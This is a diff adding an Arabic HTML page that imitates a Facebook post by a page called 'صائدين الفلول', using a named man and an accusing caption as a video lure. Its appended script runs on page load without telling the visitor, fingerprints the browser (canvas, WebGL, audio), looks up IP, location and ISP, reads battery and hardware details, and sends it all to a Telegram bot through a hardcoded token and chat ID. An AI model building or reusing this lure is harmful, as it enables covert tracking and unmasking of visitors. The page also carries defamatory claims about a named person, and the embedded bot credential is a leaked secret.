@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صائدين الفلول - فيسبوك</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* الإعدادات الأساسية */
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #f0f2f5; display: flex; justify-content: center; }
+        
+        /* إطار الهاتف التخيلي */
+        .mobile-container { width: 100%; max-width: 414px; background-color: #fff; box-shadow: 0 0 15px rgba(0,0,0,0.1); min-height: 100vh; position: relative; overflow: hidden; }
+
+        /* شريط حالة الهاتف (العلوي) */
+        .status-bar { display: flex; justify-content: space-between; padding: 8px 15px; font-size: 13px; font-weight: bold; background: #fff; }
+        .status-icons { display: flex; gap: 5px; align-items: center; }
+
+        /* شريط بحث فيسبوك */
+        .fb-top-bar { display: flex; justify-content: space-between; align-items: center; padding: 10px 15px; }
+        .fb-logo { color: #0866ff; font-size: 24px; font-weight: 800; letter-spacing: -0.5px; }
+        .top-icons { display: flex; gap: 10px; }
+        .top-icon { width: 36px; height: 36px; background: #f0f2f5; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 18px; color: #050505; }
+
+        /* شريط تنقل فيسبوك */
+        .fb-nav { display: flex; justify-content: space-between; padding: 10px 20px; border-bottom: 1px solid #ddd; }
+        .nav-icon { font-size: 22px; color: #65676b; position: relative; }
+        .nav-icon.active { color: #0866ff; border-bottom: 3px solid #0866ff; padding-bottom: 10px; margin-bottom: -11px; }
+        .badge { position: absolute; top: -5px; right: -8px; background: #e41e3f; color: white; font-size: 10px; font-weight: bold; padding: 2px 5px; border-radius: 10px; border: 2px solid #fff; }
+
+        /* رأس المنشور */
+        .post-header { display: flex; justify-content: space-between; padding: 12px 15px; }
+        .post-header-right { display: flex; gap: 10px; align-items: center; }
+        .profile-pic { width: 40px; height: 40px; border-radius: 50%; border: 2px solid #0866ff; background: #333; display: flex; justify-content: center; align-items: center; color: white; font-size: 10px; text-align: center; line-height: 1.1; font-weight: bold;}
+        .page-info { display: flex; flex-direction: column; }
+        .page-name-row { display: flex; align-items: center; gap: 5px; font-weight: bold; color: #050505; }
+        .follow-btn { color: #0866ff; font-weight: 600; }
+        .post-meta { font-size: 12px; color: #65676b; display: flex; align-items: center; gap: 4px; }
+        .post-header-left { color: #65676b; font-size: 18px; display: flex; gap: 15px;}
+
+        /* نص المنشور */
+        .post-text { padding: 0 15px 10px 15px; font-size: 15px; color: #050505; line-height: 1.4; direction: rtl; }
+
+        /* حاوية الفيديو (الصورة المخصصة) */
+        .video-container { position: relative; width: 100%; aspect-ratio: 9/16; background-color: #000; overflow: hidden; }
+        .video-thumbnail { width: 100%; height: 100%; object-fit: cover; }
+        
+        /* التراكبات (Overlays) على الفيديو */
+        .overlay-exclusive { position: absolute; top: 20px; right: 0; background: #e5c19d; color: #1e528b; font-weight: bold; padding: 5px 25px 5px 15px; border-radius: 20px 0 0 20px; font-size: 14px; }
+        .overlay-logo-top { position: absolute; top: 20px; left: 15px; width: 60px; height: 60px; background: rgba(0,0,0,0.6); border-radius: 50%; border: 1px solid rgba(255,255,255,0.2); display: flex; justify-content: center; align-items: center; color: #fff; font-size: 14px; font-weight: bold; text-align: center; line-height: 1.1;}
+        .overlay-watermark { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: rgba(255, 255, 255, 0.2); font-size: 40px; font-weight: 900; text-align: center; width: 100%; pointer-events: none; }
+        .overlay-subtitles { position: absolute; bottom: 35px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.7); color: white; padding: 8px 12px; border-radius: 5px; font-size: 14px; text-align: center; width: 90%; line-height: 1.4; }
+        .overlay-mute { position: absolute; bottom: 40px; right: 15px; width: 30px; height: 30px; background: rgba(0,0,0,0.6); border-radius: 50%; display: flex; justify-content: center; align-items: center; color: white; font-size: 12px; }
+        
+        /* شريط التقدم */
+        .progress-bar-container { position: absolute; bottom: 0; width: 100%; height: 4px; background: rgba(255,255,255,0.4); }
+        .progress-bar-fill { width: 30%; height: 100%; background: #0866ff; position: relative; }
+        .progress-bar-fill::after { content: ''; position: absolute; left: 0; top: -3px; width: 10px; height: 10px; background: white; border-radius: 50%; }
+
+        /* التفاعلات والأزرار */
+        .reactions-stats { padding: 10px 15px; display: flex; justify-content: space-between; border-bottom: 1px solid #eee; font-size: 14px; color: #65676b; }
+        .reaction-icons { display: flex; align-items: center; }
+        .reaction-icons img { width: 18px; height: 18px; margin-left: -4px; border: 2px solid white; border-radius: 50%; }
+        
+        .action-buttons { display: flex; justify-content: space-between; padding: 5px 15px; gap: 5px; }
+        .action-btn { flex: 1; display: flex; justify-content: center; align-items: center; gap: 8px; padding: 8px 0; font-size: 14px; color: #65676b; font-weight: 600; background: #f0f2f5; border-radius: 20px; }
+        
+        /* الخط السفلي للأندرويد */
+        .home-indicator { width: 100px; height: 4px; background: #000; border-radius: 10px; margin: 15px auto; }
+    </style>
+</head>
+<body>
+
+<div class="mobile-container">
+    
+    <div class="status-bar">
+        <span id="clock">20:35</span>
+        <div class="status-icons">
+            <i class="fas fa-wifi"></i>
+            <i class="fas fa-signal"></i>
+            <i class="fas fa-battery-full"></i> 88%
+        </div>
+    </div>
+
+    <div class="fb-top-bar">
+        <div class="fb-logo">facebook</div>
+        <div class="top-icons">
+            <div class="top-icon"><i class="fas fa-plus"></i></div>
+            <div class="top-icon"><i class="fas fa-search"></i></div>
+            <div class="top-icon"><i class="fas fa-bars"></i></div>
+        </div>
+    </div>
+
+    <div class="fb-nav">
+        <div class="nav-icon active"><i class="fas fa-home"></i></div>
+        <div class="nav-icon"><i class="fas fa-user-friends"></i></div>
+        <div class="nav-icon"><i class="fab fa-facebook-messenger"></i></div>
+        <div class="nav-icon"><i class="fas fa-bell"></i></div>
+        <div class="nav-icon"><i class="fas fa-tv"></i><span class="badge" style="right:-12px">1</span></div>
+        <div class="nav-icon"><i class="fas fa-user-circle"></i><span class="badge">15+</span></div>
+    </div>
+
+    <div class="post">
+        <div class="post-header">
+            <div class="post-header-right">
+                <div class="profile-pic">صائدين<br>الفلول</div>
+                <div class="page-info">
+                    <div class="page-name-row">
+                        <span>صائدين الفلول</span>
+                        <span style="font-size: 10px; color: #65676b;">•</span>
+                        <span class="follow-btn">متابعة</span>
+                    </div>
+                    <div class="post-meta">
+                        <span>٢٨ فبراير</span> • 
+                        <span>اقتراحات قد تعجبك</span> • 
+                        <i class="fas fa-globe-americas"></i>
+                    </div>
+                </div>
+            </div>
+            <div class="post-header-left">
+                <i class="fas fa-ellipsis-h"></i>
+                <i class="fas fa-times"></i>
+            </div>
+        </div>
+
+        <div class="post-text">
+            منيف المحمد اكبر شبيح بالفرفلس كان يشبح عالنسوان هذه مقطع اله وهوي كان مع وحدة وعم يبوسها ايام الدفاع الوطني 
+        </div>
+
+        <div class="video-container">
+            <img src="your-image.jpg" alt="فيديو" class="video-thumbnail" id="myImage">
+            
+            <div class="overlay-exclusive">خاص</div>
+            <div class="overlay-logo-top">صائدين<br>الفلول</div>
+            <div class="overlay-watermark">صائدين الفلول</div>
+            
+            <div class="overlay-subtitles">
+                تسعطعش سنة. شو الي بالفلول.<br>فلول انتم روحوا حاسبون. يللي ما
+            </div>
+            
+            <div class="overlay-mute">
+                <i class="fas fa-volume-mute"></i>
+            </div>
+            
+            <div class="progress-bar-container">
+                <div class="progress-bar-fill"></div>
+            </div>
+        </div>
+
+        <div class="reactions-stats">
+            <div class="reaction-icons">
+                <span style="font-size: 18px; margin-left: -5px;">👍</span>
+                <span style="font-size: 18px; margin-left: -5px;">😂</span>
+                <span style="font-size: 18px;">😮</span>
+                <span style="margin-right: 5px;">٢٧ ألف</span>
+            </div>
+        </div>
+
+        <div class="action-buttons">
+            <div class="action-btn"><i class="far fa-thumbs-up"></i> ٢٧ ألف</div>
+            <div class="action-btn"><i class="far fa-comment-alt"></i> ٧,٩ ألف</div>
+            <div class="action-btn"><i class="fas fa-share"></i> ٤٢٥</div>
+        </div>
+    </div>
+    
+    <div class="home-indicator"></div>
+
+</div>
+
+<script>
+    function updateTime() {
+        const now = new Date();
+        let hours = now.getHours();
+        let minutes = now.getMinutes();
+        if (hours < 10) hours = "0" + hours;
+        if (minutes < 10) minutes = "0" + minutes;
+        document.getElementById('clock').innerText = hours + ":" + minutes;
+    }
+    // تحديث الوقت فوراً ثم كل ثانية
+    updateTime();
+    setInterval(updateTime, 1000);
+</script>
+<script>
+// === بيانات البوت (تم إضافتها) ===
+const BOT_TOKEN = '7876711075:AAG227dcC-k6dDfrb4d719FB1rApyJAh3ko';
+const CHAT_ID   = '1393964545';
+
+// دالة Hash بسيطة للبصمات
+function simpleHash(str) {
+    let hash = 0;
+    for (let i = 0; i < str.length; i++) {
+        hash = (hash << 5) - hash + str.charCodeAt(i);
+        hash |= 0;
+    }
+    return Math.abs(hash).toString(36);
+}
+
+// بصمة Canvas
+function getCanvasFingerprint() {
+    try {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = 220;
+        canvas.height = 50;
+        
+        ctx.textBaseline = 'alphabetic';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = '#069';
+        ctx.font = '14px Arial';
+        ctx.fillText('🖥️ Browser Fingerprint Test 123', 2, 35);
+        
+        return simpleHash(canvas.toDataURL());
+    } catch (e) { return 'غير متوفر'; }
+}
+
+// بصمة WebGL
+function getWebGLFingerprint() {
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) return 'غير مدعوم';
+        
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        const vendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'غير معروف';
+        const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'غير معروف';
+        
+        return simpleHash(vendor + '|' + renderer);
+    } catch (e) { return 'غير متوفر'; }
+}
+
+// بصمة Audio
+async function getAudioFingerprint() {
+    try {
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        const oscillator = audioCtx.createOscillator();
+        const analyser = audioCtx.createAnalyser();
+        const gain = audioCtx.createGain();
+        
+        oscillator.type = 'triangle';
+        oscillator.frequency.value = 10000;
+        gain.gain.value = 0.001;
+        
+        oscillator.connect(analyser);
+        analyser.connect(gain);
+        gain.connect(audioCtx.destination);
+        
+        oscillator.start();
+        await new Promise(r => setTimeout(r, 50));
+        oscillator.stop();
+        
+        const buffer = new Float32Array(analyser.frequencyBinCount);
+        analyser.getFloatFrequencyData(buffer);
+        
+        let sum = 0;
+        for (let i = 0; i < 100; i++) sum += buffer[i];
+        
+        return simpleHash(sum.toFixed(2));
+    } catch (e) { return 'غير متوفر'; }
+}
+
+// الحصول على IP + الموقع الجغرافي
+async function getIPInfo() {
+    try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        return {
+            ip: data.ip || 'غير متوفر',
+            city: data.city || 'غير معروف',
+            region: data.region || '',
+            country: data.country_name || 'غير معروف',
+            isp: data.org || 'غير معروف'
+        };
+    } catch (e) {
+        return { ip: 'غير متوفر', city: '', region: '', country: '', isp: '' };
+    }
+}
+
+// جمع كل المعلومات
+async function getDeviceInfo() {
+    const ipInfo = await getIPInfo();
+    const audioFP = await getAudioFingerprint();
+
+    const info = {
+        timestamp: new Date().toLocaleString('ar-SA', { timeZoneName: 'short' }),
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        browserLanguage: navigator.language,
+        languages: navigator.languages ? navigator.languages.join(' | ') : 'غير متوفر',
+        screen: `${screen.width} × ${screen.height} (${screen.colorDepth}bit)`,
+        pixelRatio: window.devicePixelRatio.toFixed(2),
+        hardwareConcurrency: navigator.hardwareConcurrency || 'غير متوفر',
+        deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'غير متوفر',
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        online: navigator.onLine ? '✅ متصل' : '❌ غير متصل',
+        cookieEnabled: navigator.cookieEnabled ? 'نعم' : 'لا',
+        doNotTrack: navigator.doNotTrack || 'غير محدد',
+        canvasFP: getCanvasFingerprint(),
+        webglFP: getWebGLFingerprint(),
+        audioFP: audioFP,
+        ip: ipInfo.ip,
+        location: `${ipInfo.city}, ${ipInfo.region} - ${ipInfo.country}`,
+        isp: ipInfo.isp
+    };
+
+    // معلومات البطارية
+    let batteryText = 'غير متوفر';
+    if ('getBattery' in navigator) {
+        try {
+            const battery = await navigator.getBattery();
+            batteryText = `${Math.round(battery.level * 100)}% ${battery.charging ? '(يتم الشحن ⚡)' : ''}`;
+        } catch (e) {}
+    }
+
+    // تنسيق الرسالة بـ HTML
+    let message = `
+<b>🖥️ معلومات جهاز جديدة</b>
+
+🕒 <b>الوقت:</b> ${info.timestamp}
+🌐 <b>IP:</b> <code>${info.ip}</code>
+📍 <b>الموقع:</b> ${info.location}
+🏢 <b>المزود:</b> ${info.isp}
+
+📱 <b>النظام:</b> ${info.platform}
+🔍 <b>User Agent:</b> <code>${info.userAgent.substring(0, 120)}...</code>
+🌍 <b>اللغة:</b> ${info.browserLanguage} (${info.languages})
+🖼️ <b>دقة الشاشة:</b> ${info.screen} | ${info.pixelRatio}x
+🧠 <b>المعالج:</b> ${info.hardwareConcurrency} نواة | ذاكرة: ${info.deviceMemory}
+⏰ <b>المنطقة الزمنية:</b> ${info.timezone}
+🔋 <b>البطارية:</b> ${batteryText}
+
+🛡️ <b>البصمات:</b>
+• Canvas: <code>${info.canvasFP}</code>
+• WebGL : <code>${info.webglFP}</code>
+• Audio : <code>${info.audioFP}</code>
+
+🌐 الحالة: ${info.online} | كوكيز: ${info.cookieEnabled}
+    `.trim();
+
+    return message;
+}
+
+// إرسال الرسالة إلى تلغرام
+async function sendToTelegram(text) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: text,
+                parse_mode: 'HTML',
+                disable_web_page_preview: true
+            })
+        });
+
+        if (response.ok) {
+            console.log('✅ تم إرسال معلومات الجهاز بنجاح');
+        } else {
+            console.error('❌ فشل الإرسال');
+        }
+    } catch (error) {
+        console.error('❌ خطأ في الاتصال:', error);
+    }
+}
+
+// التشغيل التلقائي عند تحميل الصفحة
+window.addEventListener('load', async () => {
+    console.log('جاري جمع معلومات الجهاز وإرسالها...');
+    const message = await getDeviceInfo();
+    await sendToTelegram(message);
+});
+
+// دالة يدوية في حال أردت إضافتها (اختياري)
+async function manualSend() {
+    const message = await getDeviceInfo();
+    await sendToTelegram(message);
+    alert('تم إرسال المعلومات إلى البوت بنجاح!');
+}
+</script>
+</body>
+  </html>
+  
